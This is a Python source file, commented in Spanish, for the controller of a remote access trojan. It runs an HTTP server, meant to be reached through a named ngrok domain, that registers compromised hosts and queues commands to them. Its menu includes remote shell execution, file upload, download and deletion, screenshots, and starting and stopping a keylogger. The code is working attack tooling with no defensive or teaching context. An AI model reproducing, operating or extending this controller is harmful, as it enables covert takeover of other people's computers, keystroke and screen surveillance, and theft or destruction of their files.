from colorama import Style, Fore, init
import base64
import simplejson
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
import cgi 
import os # Importar el módulo os para chdir

# antes de ejecutar el controller configurar ngrok con: ngrok http --domain elfrieda-weightiest-alaya.ngrok-free.dev 8465

# Inicializar colorama
init(autoreset=True)

class CommandHandler(BaseHTTPRequestHandler):
    """
    Esta clase maneja las peticiones HTTP entrantes.
    Cada petición (GET, POST) se maneja en una instancia separada de esta clase.
    """

    def _send_json_response(self, status_code, data):
        """Función auxiliar para enviar respuestas en formato JSON."""
        self.send_response(status_code)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(simplejson.dumps(data).encode('utf-8'))

    def do_POST(self):
        """Maneja las peticiones POST."""
        # Obtenemos acceso a la instancia principal del servidor de control
        control_server = self.server.control_server

        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            json_data = simplejson.loads(post_data)
        except simplejson.JSONDecodeError:
            self._send_json_response(400, {"status": "error", "message": "Bad JSON format"})
            return

        # --- Endpoint de registro ---
        if self.path == '/register':
            hostname = json_data.get("hostname")
            if not hostname:
                self._send_json_response(400, {"status": "error", "message": "Hostname required"})
                return

            with control_server.lock:
                client_id = control_server.next_id
                control_server.clients[client_id] = {
                    "info": {
                        "address": self.client_address[0],
                        "hostname": hostname,
                        "current_directory": "N/A" # Añadir el directorio actual
                    },
                    "command_queue": [],
                    "command_result": None,
                    "result_event": threading.Event()
                }
                control_server.next_id += 1
                
                print(f"\n{Fore.CYAN}New client registered from:{Style.RESET_ALL} {self.client_address[0]} ({hostname}) assigned ID: {client_id}")
                
                if control_server.current_client_id is None:
                    control_server.current_client_id = client_id
                    print(f"{Fore.YELLOW}Automatically switched to new client: ID {client_id} ({hostname}){Style.RESET_ALL}")

            self._send_json_response(200, {"status": "ok", "id": client_id})
            return

        # --- Endpoint de resultado ---
        if self.path.startswith('/post_result/'):
            try:
                client_id = int(self.path.split('/')[-1])
                with control_server.lock:
                    if client_id in control_server.clients:
                        client = control_server.clients[client_id]
                        result = json_data.get("result")
                        
                        # Manejar el resultado de 'chdir' específicamente
                        if isinstance(result, dict) and "chdir_success" in result:
                            if result["chdir_success"]:
                                client["info"]["current_directory"] = result["new_directory"]
                                client["command_result"] = f"{Fore.GREEN}Changed directory to: {result['new_directory']}{Style.RESET_ALL}"
                            else:
                                client["command_result"] = f"{Fore.RED}Error changing directory: {result['error']}{Style.RESET_ALL}"
                        else:
                            client["command_result"] = result
                            
                        client["result_event"].set()
                        self._send_json_response(200, {"status": "ok"})
                    else:
                        self._send_json_response(404, {"status": "error", "message": "Client ID not found"})
                return
            except (ValueError, IndexError):
                self._send_json_response(400, {"status": "error", "message": "Invalid client ID format"})
                return

        self._send_json_response(404, {"status": "error", "message": "Endpoint not found"})

    def do_GET(self):
        """Maneja las peticiones GET."""
        control_server = self.server.control_server

        # --- Endpoint para obtener comandos ---
        if self.path.startswith('/get_command/'):
            try:
                client_id = int(self.path.split('/')[-1])
                command_to_send = {"command": "sleep"} # Por defecto, dormir

                with control_server.lock:
                    if client_id not in control_server.clients:
                        self._send_json_response(404, {"command": "quit", "message": "Unknown ID"})
                        return
                    
                    client = control_server.clients[client_id]
                    if client["command_queue"]:
                        command_to_send = client["command_queue"].pop(0)
                
                self._send_json_response(200, command_to_send)
                return
            except (ValueError, IndexError):
                self._send_json_response(400, {"status": "error", "message": "Invalid client ID format"})
                return

        self._send_json_response(404, {"status": "error", "message": "Endpoint not found"})

    def log_message(self, format, *args):
        """Silencia el logging por defecto para mantener la consola limpia."""
        return


class HttpControlServer:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        
        # --- MODIFICADO: Configuración del servidor HTTP nativo ---
        # Instanciamos el servidor HTTP, pasándole nuestra clase de manejo personalizada
        self.http_server = HTTPServer((self.ip, self.port), CommandHandler)
        # Hacemos que la instancia principal del servidor sea accesible desde el manejador
        self.http_server.control_server = self

        self.clients = {}
        self.next_id = 1
        self.current_client_id = None
        self.lock = threading.Lock()

    def run_server(self):
        """Ejecuta el servidor HTTP en un hilo separado."""
        server_thread = threading.Thread(target=self.http_server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
               

        # Inicializa Colorama (necesario para que los colores funcionen en Windows)


        # Tu arte ASCII
        ascii_art = r"""
                                                 %%%                                                 
                                              %%%%%%%                                               
                                            %%%%%-+%%%%%                                            
                                         %%%%%#:.:..-%%%%%%                                         
                                    %%%%%%%#-..*@@*+: .+%%%%%%%%                                    
                         %%%%%%%%%%%%%%#+:..=%@@@@****=: .-*%%%%%%%%%%%%%%%                         
                         %%%%%%%#*+=:. .-*@@@@@@@@*******+-....-=*##%%%%%%%                         
                        %%%#..:::=+*#@@@@@@@@@@@@@************+=--:.....%%%                         
                        %%%*.=@@@@@@@@@@@@@@@@@@@@********************..#%%                         
                        %%%* =@@@@@@@@@@@@@@@@@@@@********************..#%%%                        
                        %%%* +@@@@@@@@@@@@@@@@@@@@********************:.#%%%                        
                        %%%* +@@@@@@:*%@@@@@@@@@@@***********+--******:.#%%%                        
                        %%%*.=@@@@@@=    -%@@@@@@@******+=.    -******..#%%                         
                        %%%#.=@@@@@@+        .*@@@***:         +******..%%%                         
                         %%#:.@@@@@@+         -@@@***.         ******+ -%%%                         
                         %%%=.@@@@@@@@@:      =@@@***.     .-********. #%%%                         
                          %%# :@@@@@@@@@@@-.  =@@@***.  .=**********+ -%%%                          
                          %%%= -@@@@@@@@@@@=  =@@@***.  ***********+. *%%%                          
                          %%%#. .==@@@@@@@@#  =@@@***:  ********+::  -%%%                           
                           %%%#..#@@%@@@@@@@  :@@@**+. -*****++***: :%%%%                           
                            %%%+.+@@@@@@@@@@.  .#@*-.  =**********..#%%%                            
                             %%%+.=@@@@@@@@@*   .=:   .=*********..#%%%                             
                              %%%+ -@@@@@@@@#         .********+..#%%%                              
                               %%%*.:@@@@@@@%.        .*******=.:#%%%                               
                                %%%%-.+@@@@@@:        -*****+: +%%%%                                
                                 %%%%#..#@@@@:        *****-.:#%%%                                  
                                   %%%%+..%@@*       .***- .*%%%%                                   
                                     %%%%+..*@       :*: .*%%%%                                     
                                       %%%%*..        .:#%%%%                                       
                                         %%%%%=      *%%%%%                                         
                                           %%%%%%##%%%%%                                            
                                              %%%%%%%%                                              
                                                                                                    
                                                                                                    
%%%%%%%%%%%%%%%% %%%%%%%%%%%%%     %%%%%%%%%%%%%%%% %%%%%%%%%%%%%%%%%%%%%     %%%%%%    %%%%%%%%%%  
  %%%%%%%%%%%%%%   %%%%%%%%%%%%%%%   %%%%%%%%%%%%%%   %%%%%%%   %%%%%%%         %%%   %%%%%%  %%%%  
  %%%%%%      %%   %%%%%%   %%%%%%%  %%%%%%%      %   %%%%%%%   %%%%%%%         %%%  %%%%%       %  
  %%%%%%       %   %%%%%%   %%%%%%%  %%%%%%%     %%   %%%%%%%   %%%%%%%         %%%  %%%%%%%%       
  %%%%%%     %%    %%%%%%   %%%%%%%  %%%%%%%    %%    %%%%%%%   %%%%%%%         %%%  %%%%%%%%%%%%   
  %%%%%%%%%%%%%    %%%%%% %%%%%%%%%  %%%%%%%%%%%%%    %%%%%%%   %%%%%%%         %%%   %%%%%%%%%%%%% 
  %%%%%%    %%%    %%%%%%  %%%%%%    %%%%%%%   %%%    %%%%%%%   %%%%%%%         %%%     %%%%%%%%%%%%
  %%%%%%     %% %  %%%%%%            %%%%%%%     % %  %%%%%%%   %%%%%%%         %%%  %%     %%%%%%%%
  %%%%%%       %%  %%%%%%            %%%%%%%       %% %%%%%%%    %%%%%%        %%%%  %%        %%%%%
  %%%%%%      %%%  %%%%%%            %%%%%%%     %%%  %%%%%%%    %%%%%%%%     %%%    %%%%      %%%% 
 %%%%%%%%%%%%%%%% %%%%%%%%%         %%%%%%%%%%%%%%%% %%%%%%%%%      %%%%%%%%%%%%     %%%%%%%%%%%%   
"""

        # Define colores para diferentes partes del arte ASCII
        COLOR_PERCENT = Fore.WHITE  # Color para los símbolos '%'
        COLOR_HIGHLIGHT = Fore.CYAN # Color para caracteres como @, *, +, -, :, =
        COLOR_DEFAULT = Fore.WHITE # Color por defecto si no hay coincidencia

        # Función para colorear una línea
        def colorize_line(line):
            colored_line = ""
            for char in line:
                if char == '%':
                    colored_line += COLOR_PERCENT + char
                elif char in ['@', '*', '+', '-', ':', '=', '#', '.']:
                    colored_line += COLOR_HIGHLIGHT + char
                else:
                    colored_line += COLOR_DEFAULT + char
            return colored_line + Style.RESET_ALL # Asegura que el color se reinicie al final de la línea

        # Imprimir el arte ASCII coloreado
        for line in ascii_art.splitlines():
            print(colorize_line(line))
        print(f"{Fore.GREEN}Native HTTP Server listening on...: {Style.RESET_ALL} {self.ip}:{self.port}")

    def show_help(self):
        help_text = f"""
        {Fore.YELLOW}Available Commands:{Style.RESET_ALL}
        - {Fore.CYAN}clients{Style.RESET_ALL}                     : List active clients.
        - {Fore.CYAN}select [ID]{Style.RESET_ALL}                : Select a client by ID.
        - {Fore.CYAN}shell [command]{Style.RESET_ALL}            : Execute a shell command on the client.
        - {Fore.CYAN}chdir [directory_path]{Style.RESET_ALL}     : Change the current working directory on the client.
        - {Fore.CYAN}download [remote_path]{Style.RESET_ALL}     : Download a file from the client.
        - {Fore.CYAN}upload [local_path] [remote_path]{Style.RESET_ALL} : Upload a file to the client.
        - {Fore.CYAN}screenshot [save_path]{Style.RESET_ALL}     : Take a screenshot of the client's screen.
        - {Fore.CYAN}start_keylogger{Style.RESET_ALL}            : Start the keylogger on the client.
        - {Fore.CYAN}stop_keylogger{Style.RESET_ALL}             : Stop the keylogger and retrieve logs.
        - {Fore.CYAN}delete_file [remote_path]{Style.RESET_ALL}  : Delete a file on the client.
        - {Fore.CYAN}move_file [source_path] [dest_path]{Style.RESET_ALL} : Move/rename a file on the client.
        - {Fore.CYAN}copy_file [source_path] [dest_path]{Style.RESET_ALL} : Copy a file on the client.
        - {Fore.CYAN}quit all{Style.RESET_ALL}                    : Close server.
        - {Fore.CYAN}help{Style.RESET_ALL}                        : Show this help menu.
        """
        print(help_text)

    def save_file(self, path, content):
        try:
            with open(path, "wb") as my_file:
                my_file.write(base64.b64decode(content))
            return f"{Fore.GREEN}Download OK: {path}{Style.RESET_ALL}"
        except Exception as e:
            return f"{Fore.RED}Error saving file: {e}{Style.RESET_ALL}"

    def get_file_content(self, path):
        try:
            with open(path, "rb") as my_file:
                return base64.b64encode(my_file.read()).decode('utf-8')
        except FileNotFoundError:
            return f"{Fore.RED}Error: File '{path}' not found locally.{Style.RESET_ALL}"
        except Exception as e:
            return f"{Fore.RED}Error reading file: {e}{Style.RESET_ALL}"
            
    def list_clients(self):
        with self.lock:
            if not self.clients:
                print(f"{Fore.YELLOW}No active clients.{Style.RESET_ALL}")
                return

            print(f"\n{Fore.MAGENTA}--- Active Clients ---{Style.RESET_ALL}")
            for cid, data in self.clients.items():
                info = data["info"]
                selected_marker = f" {Fore.YELLOW}(Current){Style.RESET_ALL}" if cid == self.current_client_id else ""
                print(f"  ID: {cid} | Hostname: {info['hostname']} | Address: {info['address']} | CWD: {info['current_directory']} {selected_marker}")
            print(f"{Fore.MAGENTA}-----------------------{Style.RESET_ALL}\n")

    def select_client(self, cid):
        try:
            cid = int(cid)
            with self.lock:
                if cid in self.clients:
                    self.current_client_id = cid
                    info = self.clients[cid]["info"]
                    print(f"{Fore.GREEN}Switched to client ID: {cid} ({info['hostname']} - {info['address']}){Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}Error: No client found with ID {cid}.{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Error: Invalid ID. Please enter a number.{Style.RESET_ALL}")

    def execute_command_on_client(self, command_parts):
        with self.lock:
            if self.current_client_id not in self.clients:
                return f"{Fore.RED}Current client ID {self.current_client_id} is no longer active.{Style.RESET_ALL}"
            
            client_data = self.clients[self.current_client_id]
            client_data["result_event"].clear()
            
            command_obj = {"command": command_parts[0], "args": command_parts[1:]}
            
            if command_obj["command"] == "upload":
                if len(command_parts) < 3:
                    return f"{Fore.RED}Usage: upload [local_path] [remote_path]{Style.RESET_ALL}"
                file_content = self.get_file_content(command_parts[1])
                if file_content.startswith(Fore.RED): return file_content
                command_obj["args"] = [command_parts[2], file_content] # remote_path, file_content

            elif command_obj["command"] == "shell":
                command_obj["args"] = [" ".join(command_parts[1:])] # Unir todos los args en un solo comando de shell
            
            elif command_obj["command"] == "chdir": # Nuevo comando chdir
                if len(command_parts) < 2:
                    return f"{Fore.RED}Usage: chdir [directory_path]{Style.RESET_ALL}"
                command_obj["args"] = [command_parts[1]] # El path al que cambiar
            
            elif command_obj["command"] == "screenshot":
                if len(command_parts) < 2:
                    return f"{Fore.RED}Usage: screenshot [save_path]{Style.RESET_ALL}"
                command_obj["args"] = [command_parts[1]] # Solo el path remoto

            elif command_obj["command"] in ["delete_file", "start_keylogger", "stop_keylogger"]:
                if command_obj["command"] == "delete_file" and len(command_parts) < 2:
                    return f"{Fore.RED}Usage: delete_file [remote_path]{Style.RESET_ALL}"
                # No se necesitan cambios adicionales para estos, solo los args existentes

            elif command_obj["command"] in ["move_file", "copy_file"]:
                if len(command_parts) < 3:
                    return f"{Fore.RED}Usage: {command_parts[0]} [source_path] [dest_path]{Style.RESET_ALL}"
                # Los args ya están en el formato correcto [source, dest]

            client_data["command_queue"].append(command_obj)

        print(f"{Fore.YELLOW}Waiting for client response...{Style.RESET_ALL}")
        timeout_seconds = 60
        if client_data["result_event"].wait(timeout=timeout_seconds):
            return client_data["command_result"]
        else:
            return f"{Fore.RED}Error: Timed out after {timeout_seconds}s waiting for response from client ID {self.current_client_id}.{Style.RESET_ALL}"

    def start_controller(self):
        self.show_help()
        while True:
            try:
                prompt_text = f"{Fore.BLUE}Enter command{Style.RESET_ALL} "
                if self.current_client_id:
                     with self.lock:
                        if self.current_client_id in self.clients:
                            info = self.clients[self.current_client_id]["info"]
                            prompt_text += f"({Fore.CYAN}ID:{self.current_client_id} {info['hostname']} CWD:{info['current_directory']}{Style.RESET_ALL})"
                        else:
                            self.current_client_id = None
                            prompt_text += f"({Fore.RED}No active client){Style.RESET_ALL}"
                else:
                    prompt_text += f"({Fore.RED}No active client){Style.RESET_ALL}"
                prompt_text += ": "
                
                command_input = input(prompt_text)
                
                if command_input.lower() in ["help", "clients", "quit all"] or command_input.lower().startswith("select "):
                    # Manejar comandos que no necesitan un cliente
                    if command_input.lower() == "help": self.show_help()
                    elif command_input.lower() == "clients": self.list_clients()
                    elif command_input.lower().startswith("select "): self.select_client(command_input.split(" ")[1])
                    elif command_input.lower() == "quit all":
                        print(f"{Fore.YELLOW}Shutting down server.{Style.RESET_ALL}")
                        self.http_server.shutdown() # Cierra el servidor HTTP limpiamente
                        exit()
                    continue

                if self.current_client_id is None:
                    print(f"{Fore.RED}No client selected. Use 'clients' to list and 'select [ID]' to choose.{Style.RESET_ALL}")
                    continue

                command_parts = command_input.split(" ", 1) # Divide solo el primer espacio para comandos con múltiples args

                # Casos especiales para comandos que necesitan el split en un solo argumento
                if command_parts[0] in ["shell", "upload", "download", "screenshot", "delete_file", "move_file", "copy_file", "chdir"]:
                    if len(command_parts) == 1: # Comando sin argumentos (ej. "shell" solo)
                        if command_parts[0] == "shell":
                            command_output = f"{Fore.RED}Usage: shell [command]{Style.RESET_ALL}"
                        elif command_parts[0] == "download":
                            command_output = f"{Fore.RED}Usage: download [remote_path]{Style.RESET_ALL}"
                        elif command_parts[0] == "upload":
                            command_output = f"{Fore.RED}Usage: upload [local_path] [remote_path]{Style.RESET_ALL}"
                        elif command_parts[0] == "screenshot":
                            command_output = f"{Fore.RED}Usage: screenshot [save_path]{Style.RESET_ALL}"
                        elif command_parts[0] == "delete_file":
                            command_output = f"{Fore.RED}Usage: delete_file [remote_path]{Style.RESET_ALL}"
                        elif command_parts[0] == "move_file":
                            command_output = f"{Fore.RED}Usage: move_file [source_path] [dest_path]{Style.RESET_ALL}"
                        elif command_parts[0] == "copy_file":
                            command_output = f"{Fore.RED}Usage: copy_file [source_path] [dest_path]{Style.RESET_ALL}"
                        elif command_parts[0] == "chdir":
                            command_output = f"{Fore.RED}Usage: chdir [directory_path]{Style.RESET_ALL}"
                        print(command_output)
                        continue
                    else:
                        command_parts = command_input.split(" ", 1) # Solo dividir en el primer espacio
                        if command_parts[0] in ["upload", "move_file", "copy_file"]: # Estos necesitan 2 argumentos
                             command_parts = command_input.split(" ", 2)
                        else:
                            command_parts = command_input.split(" ", 1)
                else:
                    command_parts = command_input.split(" ")

                command_output = ""
                
                try:
                    command_output = self.execute_command_on_client(command_parts)
                    
                    if isinstance(command_output, str) and command_output.startswith(Fore.RED):
                        print(command_output)
                        continue

                    # Manejo de resultados específicos
                    if command_parts[0] == "download" and isinstance(command_output, str) and "Error!" not in command_output:
                        command_output = self.save_file(command_parts[1], command_output)
                    elif command_parts[0] == "screenshot" and isinstance(command_output, str) and "Error!" not in command_output:
                        command_output = self.save_file(command_parts[1], command_output)
                    
                except Exception as e:
                    command_output = f"{Fore.RED}Error during command processing: {e}"
                
                if command_output:
                    print(command_output)
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}Ctrl+C detected. Type 'quit all' to exit.{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}An unexpected error occurred: {e}")

# --- Main execution ---
if __name__ == "__main__":
    control_server = HttpControlServer("0.0.0.0", 8465)
    control_server.run_server()
    control_server.start_controller()